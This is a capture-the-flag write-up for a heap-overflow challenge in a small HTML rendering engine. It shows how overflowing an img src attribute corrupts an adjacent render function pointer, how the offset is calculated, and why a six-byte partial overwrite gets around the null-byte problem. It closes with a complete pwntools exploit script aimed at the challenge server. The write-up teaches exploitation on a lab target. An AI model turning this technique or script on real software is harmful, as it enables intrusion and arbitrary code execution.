# 🧠 BROWZI - MiniBrowser Engine v1.0 (Heap Exploitation Writeup)

## 📌 Overview

This challenge implements a minimal HTML parser and rendering engine.  
It parses user-controlled HTML input, builds a DOM-like structure (`Node`), and assigns rendering callbacks through a `RenderOps` structure.

During execution, the program calls:

```c
n->ops->render(n);
```

The goal is to redirect execution to the hidden `win()` function to retrieve the flag.

---

## 🔍 Step 1 — Understanding the Structures

### Node structure

```c
struct Node {
    char type[16];
    char id[32];
    RenderOps *ops;
    struct Node *parent;
    struct Node *first_child;
    struct Node *next_sibling;
    char data[128];
};
```

### RenderOps structure

```c
struct RenderOps {
    void (*render)(struct Node *);
    void (*onload)(struct Node *);
    void (*onerror)(struct Node *);
};
```

### Key Observations

- `id` is **bounded (32 bytes)** → no overflow
- No `src` field exists in the struct
- The `src` attribute is stored in `data[128]`
- `RenderOps` is allocated **right after Node on the heap**

---

## 💥 Step 2 — Vulnerability

There is a **heap overflow** in:

```html
<img src="...">
```

The `src` content is copied into `data[128]` **without bounds checking**, allowing overflow into the adjacent `RenderOps` structure.

Target:

```c
ops->render
```

---

## 🧪 Step 3 — Failed Attempts

### ❌ Attempt 1 — Using `id`

```html
<div id="AAAA...">
```

- Input truncated
- No overflow

➡️ `id` is safe

---

### ❌ Attempt 2 — `div src`

```html
<div src="AAAA...">
```

- Ignored by parser

➡️ Not a valid vector

---

### ✅ Attempt 3 — `img src`

```html
<img src="AAAA...">
```

- Crash occurs
- Control over execution achieved

➡️ Correct attack vector

---

## 📐 Step 4 — Offset Calculation

From memory:

- `data` → offset `0x50`
- `RenderOps` → offset `0xe0`

```text
offset = 0xe0 - 0x50 = 144
```

---

## 🎯 Step 5 — Exploitation Goal

Overwrite:

```c
ops->render → win
```

So that:

```c
n->ops->render(n);
```

becomes:

```c
win(n);
```

---

## ⚠️ Step 6 — Why Classic Overwrites Failed

### ❌ Full overwrite

```python
p64(win_addr)
```

Problem:
- Contains `\x00`
- String gets truncated

---

### ❌ Partial overwrite (2–4 bytes)

- Overwrite occurs
- BUT null terminator corrupts pointer

Example observed:

```text
RDX = 0x55550041444d
```

---

## 🧠 Step 7 — Final Insight

C strings automatically append `\x00`.

Solution:
👉 overwrite only **6 bytes**

```python
p64(win_addr)[:6]
```

This works because:
- Last 2 bytes of a valid address are already `\x00`
- The string terminator completes the pointer correctly

---

## 🚀 Step 8 — Final Exploit

```python
from pwn import *

context.arch = "amd64"

r = remote("167.86.100.105", 5001)

# Leak render_div
r.recvuntil(b"render_div  @ ")
render_div = int(r.recvline().strip(), 16)

# Compute win address
win_addr = render_div - 0xb6

log.success(f"render_div = {hex(render_div)}")
log.success(f"win        = {hex(win_addr)}")

offset = 144

# 6-byte overwrite
target = p64(win_addr)[:6]

payload = b'<img src="' + b'A' * offset + target + b'">'

r.sendline(payload)
r.sendline(b"")

r.interactive()
```

---

## 🏁 Result

```text
=== CONGRATULATIONS! ===
N7{br0wz1_us3_4ft3r_fr33_d0m_m4n1pul4t10n}
```

---

## 🧠 Key Takeaways

- Heap layout understanding is critical
- Function pointers on heap are prime targets
- Choosing the correct input vector is essential
- Partial overwrite is powerful against null-byte constraints
- Always validate behavior in GDB

---

## 🔥 Summary

| Step | Description |
|------|------------|
| 1 | Leak `render_div` |
| 2 | Compute `win` |
| 3 | Use `<img src>` |
| 4 | Overflow `data[128]` |
| 5 | Overwrite `ops->render` |
| 6 | Trigger `win()` |
